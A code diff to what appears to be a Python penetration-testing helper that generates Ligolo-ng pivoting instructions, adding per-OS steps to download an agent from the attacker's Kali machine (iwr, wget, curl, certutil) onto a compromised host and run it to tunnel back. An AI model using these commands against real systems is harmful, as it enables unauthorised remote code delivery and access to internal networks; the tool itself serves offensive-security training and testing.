@@ -15,6 +15,17 @@ from dataclasses import dataclass, field
 
 _SIOCGIFADDR = 0x8915  # Linux ioctl: get an interface's IPv4 address
 
+# Ligolo-ng project pointers — surfaced in the Pivot tab so the operator can grab the current binary
+# and confirm syntax. Ligolo-ng changes often (e.g. `start` -> `tunnel_start`, `interface_create`),
+# so the tab links the releases page rather than pretending a pinned version is forever-current.
+LIGOLO_GITHUB = "https://github.com/nicocha30/ligolo-ng"
+LIGOLO_RELEASES = "https://github.com/nicocha30/ligolo-ng/releases/latest"
+LIGOLO_DOCS = "https://docs.ligolo.ng/"
+# the ligolo-ng release the copy-paste syntax below was last checked against; the tab shows this + a
+# "check releases" nudge so a stale reference is obvious. Bump when the commands are re-verified.
+LIGOLO_REF_VERSION = "v0.8"
+LIGOLO_REF_VERIFIED = "2026-07-18"
+
 
 @dataclass
 class LigoloStep:
@@ -61,14 +72,48 @@ def _clean_routes(routes: list[str]) -> list[str]:
     return out
 
 
+def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
+    # OS-specific delivery + launch of the agent on the compromised pivot host — the transfer is the
+    # step people trip on, so it's spelled out per OS. The Linux run line stays `./agent -connect ...`.
+    if agent_os == "windows":
+        return LigoloStep(
+            2,
+            "Deliver + run the agent on the Windows pivot",
+            "Kali → Windows pivot",
+            [
+                f"python3 -m http.server 8000                                 # on Kali: serve agent.exe",  # noqa: E501
+                f"iwr -Uri http://{ip}:8000/agent.exe -OutFile $env:TEMP\\agent.exe   # on pivot (PowerShell)",  # noqa: E501
+                f"& $env:TEMP\\agent.exe -connect {ip}:{port} -ignore-cert    # on pivot: dial back",  # noqa: E501
+            ],
+            "No PowerShell? certutil -urlcache -split -f http://"
+            f"{ip}:8000/agent.exe %TEMP%\\agent.exe. The agent dials back to your proxy; a session "
+            "then appears in the proxy console. Match agent.exe to your proxy's ligolo-ng version.",
+        )
+    return LigoloStep(
+        2,
+        "Deliver + run the agent on the Linux pivot",
+        "Kali → Linux pivot",
+        [
+            f"python3 -m http.server 8000                        # on Kali: serve the agent binary",  # noqa: E501
+            f"wget http://{ip}:8000/agent -O agent && chmod +x agent   # on the Linux pivot",
+            f"./agent -connect {ip}:{port} -ignore-cert          # on the Linux pivot: dial back",
+        ],
+        "curl -o agent http://"
+        f"{ip}:8000/agent works too. The agent dials back to your proxy; a session then appears in "
+        "the proxy console. Match the agent binary to your proxy's ligolo-ng version.",
+    )
+
+
 def build_ligolo_steps(
     kali_ip: str,
     port: int = 11601,
     iface: str = "ligolo",
     routes: list[str] | None = None,
+    agent_os: str = "linux",
 ) -> list[LigoloStep]:
     ip = (kali_ip or "<your-tun0-ip>").strip()
     iface = _clean_iface(iface)
+    agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
     clean = _clean_routes(routes or [])
     steps: list[LigoloStep] = [
         LigoloStep(
@@ -78,16 +123,7 @@ def build_ligolo_steps(
             [f"./proxy -selfcert -laddr 0.0.0.0:{port}"],
             "Listens for the agent (self-signed cert). Leave it running in its own terminal.",
         ),
-        LigoloStep(
-            2,
-            "Run the agent on the compromised pivot host",
-            "pivot host",
-            [
-                f"./agent -connect {ip}:{port} -ignore-cert       # Linux pivot",
-                f"agent.exe -connect {ip}:{port} -ignore-cert     # Windows pivot",
-            ],
-            "The agent dials back to your proxy; a session then appears in the proxy console.",
-        ),
+        _agent_step(ip, port, agent_os),
     ]
     console = ["session", f"interface_create --name {iface}"]
     for route in clean or ["<internal_/24>"]:
